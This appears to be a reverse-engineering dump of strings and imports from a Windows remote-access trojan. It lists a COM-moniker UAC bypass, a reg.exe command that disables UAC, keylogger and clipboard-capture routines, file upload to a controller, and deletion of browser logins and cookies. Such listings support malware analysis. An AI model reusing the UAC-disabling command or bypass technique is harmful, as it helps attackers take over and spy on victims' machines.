reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x407364	0x4652dc	string	0x4072d3	[-] NtAllocateVirtualMemory Error\n
0x407377	0x465214	string	0x4072d3	explorer.exe
0x4073d6	0x465300	string	0x4072d3	PEB: %x\n
0x40742f	0x46530c	string	0x407424	[+] ucmAllocateElevatedObject\n
0x40743d	0x4653d8	string	0x407424	{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
0x407457	0x4070b7	string	0x407424	Qj$Z
0x407469	0x46532c	string	0x407424	Elevation:Administrator!new:
0x407488	0x465368	string	0x407424	[+] CoGetObject\n
0x4074a9	0x4584d8	import	0x407424	ole32.dll.CoGetObject
0x4074b3	0x4074bc	string	0x407424	h|SF
0x4074b5	0x465398	string	0x407424	[-] CoGetObject FAILURE\n
0x4074bc	0x46537c	string	0x407424	[+] CoGetObject SUCCESS\n
0x4074dc	0x4653b4	string	0x4074d7	[+] ucmCMLuaUtilShellExecMethod\n
0x4074f7	0x4584d0	import	0x4074d7	ole32.dll.CoInitializeEx
0x407518	0x465428	string	0x4074d7	[+] before ShellExec\n
0x407535	0x465440	string	0x4074d7	[+] ShellExec success\n
0x407550	0x4584d4	import	0x4074d7	ole32.dll.CoUninitialize
0x40759e	0x4074d7	string	0x407594	QSUVWh
0x4075c5	0x4582f0	import	0x407594	KERNEL32.dll.CloseHandle
0x4075fb	0x4582a0	import	0x407594	KERNEL32.dll.ExitProcess
0x407610	0x4582a4	import	0x407594	KERNEL32.dll.CreateMutexA
0x407621	0x465458	string	0x40761f	elev
0x407647	0x465458	string	0x40763d	elev
0x407660	0x465458	string	0x40765f	elev
0x4076b8	0x465460	string	0x40767c	/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
0x4076bd	0x4654e4	string	0x40767c	C:\Windows\System32\cmd.exe
0x4076c2	0x4582b4	import	0x40767c	KERNEL32.dll.CreateProcessA
0x4076cb	0x4582f0	import	0x40767c	KERNEL32.dll.CloseHandle
0x40777e	0x458298	import	0x407763	KERNEL32.dll.FindFirstFileW
0x407846	0x458290	import	0x407763	KERNEL32.dll.FindNextFileW
0x4078ec	0x4582f8	import	0x40788a	KERNEL32.dll.CreateFileW
0x407934	0x4582fc	import	0x40788a	KERNEL32.dll.WriteFile
0x407974	0x4582f0	import	0x40788a	KERNEL32.dll.CloseHandle
0x407991	0x458268	import	0x40788a	KERNEL32.dll.MoveFileW
0x4079f6	0x45828c	import	0x4079d4	KERNEL32.dll.GetDriveTypeA
0x407a52	0x458288	import	0x4079d4	KERNEL32.dll.lstrlenA
0x407b3b	0x407bad	string	0x407b1b	2ۍL$ blocks=Basic Latin,Arabic
0x407b5c	0x465520	string	0x407b1b	ZipFiles
0x407b68	0x46552c	string	0x407b1b	UnzipFiles
0x407b85	0x407bad	string	0x407b1b	2ۍL$ blocks=Basic Latin,Arabic
0x407b89	0x407bad	string	0x407b1b	2ۍL$ blocks=Basic Latin,Arabic
0x407be0	0x4582dc	import	0x407bbe	KERNEL32.dll.SetEvent
0x407c44	0x40827e	string	0x407bbe	3ۍL$\fS blocks=Basic Latin,Arabic
0x407c5f	0x408106	string	0x407bbe	3ۍL$\fS blocks=Basic Latin,Arabic
0x407c68	0x40808d	string	0x407bbe	3ۍL$\fS blocks=Basic Latin,Arabic
0x407c71	0x408023	string	0x407bbe	3ۍL$\fj blocks=Basic Latin,Arabic
0x407c7a	0x407dcc	string	0x407bbe	3ۍL$` blocks=Basic Latin,Arabic
0x407cae	0x458280	import	0x407bbe	KERNEL32.dll.GetFileAttributesW
0x407cd0	0x458274	import	0x407bbe	KERNEL32.dll.DeleteFileW
0x407cef	0x4655ac	string	0x407bbe	Deleted file:
0x407d2e	0x4655bc	string	0x407bbe	Unable to delete:
0x407ea4	0x465568	string	0x407bbe	Downloading file:
0x407f55	0x46557c	string	0x407bbe	Downloaded file:
0x407fcc	0x465590	string	0x407bbe	Failed to download file:
0x4080be	0x458358	import	0x407bbe	SHELL32.dll.ShellExecuteW
0x4080d4	0x465554	string	0x407bbe	Executing file:
0x40815f	0x46553c	string	0x407bbe	Browsing directory:
0x40819f	0x458270	import	0x407bbe	KERNEL32.dll.GetLogicalDriveStringsA
0x40833a	0x4655d8	string	0x407bbe	Unable to rename file!
0x408387	0x408689	string	0x407bbe	3ۍL$\fS blocks=Basic Latin,Arabic
0x408399	0x4085a9	string	0x407bbe	3ۍL$\fj blocks=Basic Latin,Arabic
0x4083eb	0x45827c	import	0x407bbe	KERNEL32.dll.SetFileAttributesW
0x408579	0x458278	import	0x407bbe	KERNEL32.dll.DeleteFileA
0x40861f	0x4582e8	import	0x407bbe	KERNEL32.dll.Sleep
0x408661	0x458368	import	0x407bbe	SHLWAPI.dll.StrToIntA
0x4086d0	0x458264	import	0x407bbe	KERNEL32.dll.CreateDirectoryW
0x4087f1	0x458298	import	0x408733	KERNEL32.dll.FindFirstFileW
0x408826	0x458290	import	0x408733	KERNEL32.dll.FindNextFileW
0x40893c	0x458284	import	0x408733	KERNEL32.dll.FindClose
0x408969	0x458284	import	0x408733	KERNEL32.dll.FindClose
0x408a21	0x4655fc	string	0x4089ac	Uploaded file:
0x408a37	0x46560c	string	0x4089ac	Failed to upload file:
0x408c0a	0x4582f8	import	0x408aa1	KERNEL32.dll.CreateFileW
0x408c42	0x458294	import	0x408aa1	KERNEL32.dll.GetFileSizeEx
0x408cfc	0x465624	string	0x408aa1	Uploading file to Controller:
0x408d97	0x45826c	import	0x408aa1	KERNEL32.dll.SetFilePointerEx
0x408db2	0x4582c4	import	0x408aa1	KERNEL32.dll.ReadFile
0x408e8b	0x4582f0	import	0x408aa1	KERNEL32.dll.CloseHandle
0x409279	0x458298	import	0x40917a	KERNEL32.dll.FindFirstFileW
0x4092d1	0x458290	import	0x40917a	KERNEL32.dll.FindNextFileW
0x4092e8	0x458284	import	0x40917a	KERNEL32.dll.FindClose
0x4094e0	0x458284	import	0x40917a	KERNEL32.dll.FindClose
0x40953e	0x458284	import	0x40917a	KERNEL32.dll.FindClose
0x409609	0x458298	import	0x40958c	KERNEL32.dll.FindFirstFileW
0x409632	0x458290	import	0x40958c	KERNEL32.dll.FindNextFileW
0x409649	0x458284	import	0x40958c	KERNEL32.dll.FindClose
0x409841	0x458284	import	0x40958c	KERNEL32.dll.FindClose
0x409ac9	0x409ab5	string	0x409a32	_^][
0x409dfa	0x4583a0	import	0x409dca	USER32.dll.GetKeyboardLayoutNameA
0x40a044	0x46566c	string	0x40a030	okmode
0x40a0c2	0x465674	string	0x40a0a0	Offline Keylogger Started
0x40a110	0x4582d8	import	0x40a0a0	KERNEL32.dll.CreateThread
0x40a129	0x40a137	string	0x40a0a0	SSVh
0x40a17c	0x4582d8	import	0x40a154	KERNEL32.dll.CreateThread
0x40a1fa	0x45825c	import	0x40a1df	KERNEL32.dll.GetModuleHandleA
0x40a208	0x45838c	import	0x40a1df	USER32.dll.SetWindowsHookExA
0x40a214	0x458258	import	0x40a1df	KERNEL32.dll.GetLastError
0x40a228	0x465690	string	0x40a1df	Keylogger initialization failure: error
0x40a262	0x4583b0	import	0x40a1df	USER32.dll.GetMessageA
0x40a271	0x4583ec	import	0x40a1df	USER32.dll.TranslateMessage
0x40a27c	0x4583e8	import	0x40a1df	USER32.dll.DispatchMessageA
0x40a2f9	0x45839c	import	0x40a28e	USER32.dll.CallNextHookEx
0x40a33b	0x458380	import	0x40a307	USER32.dll.GetForegroundWindow
0x40a346	0x4583ac	import	0x40a307	USER32.dll.GetWindowThreadProcessId
0x40a34d	0x458388	import	0x40a307	USER32.dll.GetKeyboardLayout
0x40a357	0x4583a4	import	0x40a307	USER32.dll.GetKeyState
0x40a364	0x458398	import	0x40a307	USER32.dll.GetKeyboardState
0x40a380	0x458384	import	0x40a307	USER32.dll.ToUnicodeEx
0x40a3e8	0x4582e8	import	0x40a39e	KERNEL32.dll.Sleep
0x40a3f0	0x4656bc	string	0x40a39e	]\r\n
0x40a404	0x4656c8	string	0x40a39e	\r\n[
0x40a472	0x4582e8	import	0x40a39e	KERNEL32.dll.Sleep
0x40a4d7	0x4582dc	import	0x40a4ab	KERNEL32.dll.SetEvent
0x40a520	0x4582f8	import	0x40a4ea	KERNEL32.dll.CreateFileW
0x40a52f	0x458250	import	0x40a4ea	KERNEL32.dll.GetFileSize
0x40a55c	0x4582e8	import	0x40a4ea	KERNEL32.dll.Sleep
0x40a563	0x4582f0	import	0x40a4ea	KERNEL32.dll.CloseHandle
0x40a5b5	0x4582e8	import	0x40a59b	KERNEL32.dll.Sleep
0x40a5f1	0x458264	import	0x40a59b	KERNEL32.dll.CreateDirectoryW
0x40a602	0x458280	import	0x40a59b	KERNEL32.dll.GetFileAttributesW
0x40a619	0x45827c	import	0x40a59b	KERNEL32.dll.SetFileAttributesW
0x40a693	0x458360	import	0x40a59b	SHLWAPI.dll.PathFileExistsW
0x40a6b3	0x41bf1a	string	0x40a59b	QSUW3ۋ blocks=Basic Latin,Arabic
0x40a79c	0x45827c	import	0x40a59b	KERNEL32.dll.SetFileAttributesW
0x40a7e8	0x41bf1a	string	0x40a7b6	QSUW3ۋ blocks=Basic Latin,Arabic
0x40a95e	0x41bf1a	string	0x40a908	QSUW3ۋ blocks=Basic Latin,Arabic
0x40abb8	0x4582e8	import	0x40ab4b	KERNEL32.dll.Sleep
0x40abbe	0x458380	import	0x40ab4b	USER32.dll.GetForegroundWindow
0x40abc7	0x4583a8	import	0x40ab4b	USER32.dll.GetWindowTextLengthW
0x40abfb	0x458370	import	0x40ab4b	USER32.dll.GetWindowTextW
0x40acc9	0x4582e8	import	0x40ab4b	KERNEL32.dll.Sleep
0x40acef	0x4656e4	string	0x40ab4b	minutes }\r\n
0x40acfb	0x4656f4	string	0x40ab4b	\r\n{ User has been idle for
0x40ad78	0x465710	string	0x40ad63	Online Keylogger Started
0x40adc5	0x4582d8	import	0x40ad63	KERNEL32.dll.CreateThread
0x40add3	0x40adf1	string	0x40ad63	SSVh
0x40add7	0x40ade5	string	0x40ad63	SSVh
0x40ae1b	0x4582d0	import	0x40ae04	KERNEL32.dll.CreateEventA
0x40ae93	0x4582e4	import	0x40ae04	KERNEL32.dll.WaitForSingleObject
0x40aed6	0x46572c	string	0x40aec6	Online Keylogger Stopped
0x40af29	0x4582f0	import	0x40aec6	KERNEL32.dll.CloseHandle
0x40af3c	0x45837c	import	0x40aec6	USER32.dll.UnhookWindowsHookEx
0x40af65	0x465748	string	0x40af51	Offline Keylogger Stopped
0x40afc4	0x45837c	import	0x40af51	USER32.dll.UnhookWindowsHookEx
0x40afe7	0x4582d4	import	0x40afd9	KERNEL32.dll.GetLocalTime
0x40aff0	0x465768	string	0x40afd9	\r\n[%04i/%02i/%02i %02i:%02i:%02i
0x40b068	0x458374	import	0x40afd9	USER32.dll.wsprintfW
0x40b0de	0x4657d0	string	0x40b096	[Alt]
0x40b0ed	0x4657c4	string	0x40b096	[Enter]\r\n
0x40b0fc	0x4657bc	string	0x40b096	[Tab]
0x40b10b	0x4657b4	string	0x40b096	[BckSp]
0x40b11a	0x4657d8	string	0x40b096	[Pause]
0x40b140	0x4657ac	string	0x40b096	[Space]
0x40b14f	0x4657e0	string	0x40b096	[Esc]
0x40b15e	0x4657e8	string	0x40b096	[PagUp]
0x40b180	0x4657f0	string	0x40b096	[PagDw]
0x40b18f	0x4657f8	string	0x40b096	[End]
0x40b19e	0x465800	string	0x40b096	[Start]
0x40b1ad	0x465808	string	0x40b096	[Left]
0x40b1bc	0x465810	string	0x40b096	[Up]
0x40b1cb	0x465818	string	0x40b096	[Right]
0x40b1da	0x465820	string	0x40b096	[Down]
0x40b1e9	0x465828	string	0x40b096	[Print]
0x40b1f8	0x465830	string	0x40b096	[Ins]
0x40b235	0x465848	string	0x40b096	[Menu]
0x40b244	0x465840	string	0x40b096	[Win]
0x40b253	0x465838	string	0x40b096	[Del]
0x40b262	0x465850	string	0x40b096	[F1]
0x40b280	0x465868	string	0x40b096	[F4]
0x40b28f	0x465860	string	0x40b096	[F3]
0x40b29e	0x465858	string	0x40b096	[F2]
0x40b2ad	0x465870	string	0x40b096	[F5]
0x40b2e0	0x4658a8	string	0x40b096	[F12]
0x40b2ec	0x4658a0	string	0x40b096	[F11]
0x40b2f8	0x465898	string	0x40b096	[F10]
0x40b304	0x465890	string	0x40b096	[F9]
0x40b310	0x465888	string	0x40b096	[F8]
0x40b31c	0x465880	string	0x40b096	[F7]
0x40b328	0x465878	string	0x40b096	[F6]
0x40b4c0	0x4583a4	import	0x40b4bb	USER32.dll.GetKeyState
0x40b4f6	0x46590c	string	0x40b4bb	[AltR]
0x40b502	0x465904	string	0x40b4bb	[AltL]
0x40b51a	0x4583a4	import	0x40b515	USER32.dll.GetKeyState
0x40b530	0x40b559	string	0x40b515	^ËAT- blocks=Basic Latin,Latin-1 Supplement
0x40b537	0x46591c	string	0x40b515	[CtrlR]
0x40b541	0x40b559	string	0x40b515	^ËAT- blocks=Basic Latin,Latin-1 Supplement
0x40b548	0x465914	string	0x40b515	[CtrlL]
0x40b568	0x40b56e	string	0x40b55b	ËAT- blocks=Latin-1 Supplement,Basic Latin
0x40b586	0x458394	import	0x40b583	USER32.dll.OpenClipboard
0x40b592	0x458378	import	0x40b583	USER32.dll.GetClipboardData
0x40b59a	0x458390	import	0x40b583	USER32.dll.CloseClipboard
0x40b64e	0x465924	string	0x40b5bd	\r\n[End of clipboard]\r\n
0x40b65b	0x46593c	string	0x40b5bd	\r\n[Text copied to clipboard]\r\n
0x40b6eb	0x458274	import	0x40b6de	KERNEL32.dll.DeleteFileW
0x40b716	0x458260	import	0x40b6de	KERNEL32.dll.RemoveDirectoryW
0x40b730	0x458254	import	0x40b721	KERNEL32.dll.TerminateThread
0x40b73c	0x45837c	import	0x40b721	USER32.dll.UnhookWindowsHookEx
0x40b74a	0x458254	import	0x40b721	KERNEL32.dll.TerminateThread
0x40b88e	0x465960	string	0x40b887	\AppData\Local\Google\Chrome\User Data\Default\Login Data
0x40b893	0x46599c	string	0x40b887	UserProfile
0x40b8c3	0x458278	import	0x40b887	KERNEL32.dll.DeleteFileA
0x40b8cd	0x458258	import	0x40b887	KERNEL32.dll.GetLastError
0x40b8e7	0x4659a8	string	0x40b887	\n[Chrome StoredLogins not found]
0x40b8f3	0x4659cc	string	0x40b887	\n[Chrome StoredLogins found, cleared!]
0x40b91d	0x4659f4	string	0x40b916	\AppData\Local\Google\Chrome\User Data\Default\Cookies
0x40b922	0x46599c	string	0x40b916	UserProfile
0x40b952	0x458278	import	0x40b916	KERNEL32.dll.DeleteFileA
0x40b95c	0x458258	import	0x40b916	KERNEL32.dll.GetLastError
0x40b976	0x465a2c	string	0x40b916	\n[Chrome Cookies not found]
0x40b982	0x465a48	string	0x40b916	\n[Chrome Cookies found, cleared!]
0x40b9c7	0x465a6c	string	0x40b9a5	\AppData\Roaming\Mozilla\Firefox\Profiles\
0x40b9d5	0x46599c	string	0x40b9a5	UserProfile
0x40ba24	0x458188	import	0x40b9a5	KERNEL32.dll.FindFirstFileA
0x40ba3e	0x458284	import	0x40b9a5	KERNEL32.dll.FindClose
0x40ba49	0x465a98	string	0x40b9a5	\n[Firefox StoredLogins not found]
0x40baa9	0x465ac4	string	0x40b9a5	\logins.json
0x40baeb	0x465ad4	string	0x40b9a5	\key3.db
0x40bb30	0x458278	import	0x40b9a5	KERNEL32.dll.DeleteFileA
0x40bb3a	0x458258	import	0x40b9a5	KERNEL32.dll.GetLastError
0x40bb49	0x458278	import	0x40b9a5	KERNEL32.dll.DeleteFileA
0x40bb53	0x458258	import	0x40b9a5	KERNEL32.dll.GetLastError
0x40bb61	0x4580b4	import	0x40b9a5	KERNEL32.dll.FindNextFileA
0x40bb74	0x465ae0	string	0x40b9a5	\n[Firefox StoredLogins Cleared!]
0x40bb87	0x458284	import	0x40b9a5	KERNEL32.dll.FindClose
0x40bbc7	0x465a6c	string	0x40bbac	\AppData\Roaming\Mozilla\Firefox\Profiles\
0x40bbd5	0x46599c	string	0x40bbac	UserProfile
0x40bc24	0x458188	import	0x40bbac	KERNEL32.dll.FindFirstFileA
0x40bc3e	0x458284	import	0x40bbac	KERNEL32.dll.FindClose
0x40bc49	0x465b04	string	0x40bbac	\n[Firefox Cookies not found]
0x40bca1	0x465b24	string	0x40bbac	\cookies.sqlite
0x40bce0	0x458278	import	0x40bbac	KERNEL32.dll.DeleteFileA
0x40bcea	0x458258	import	0x40bbac	KERNEL32.dll.GetLastError
0x40bcfe	0x4580b4	import	0x40bbac	KERNEL32.dll.FindNextFileA
0x40bd11	0x465b04	string	0x40bbac	\n[Firefox Cookies not found]
0x40bd24	0x458284	import	0x40bbac	KERNEL32.dll.FindClose
0x40bd72	0x465b58	string	0x40bd5e	Cookies
0x40bd77	0x465b60	string	0x40bd5e	Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
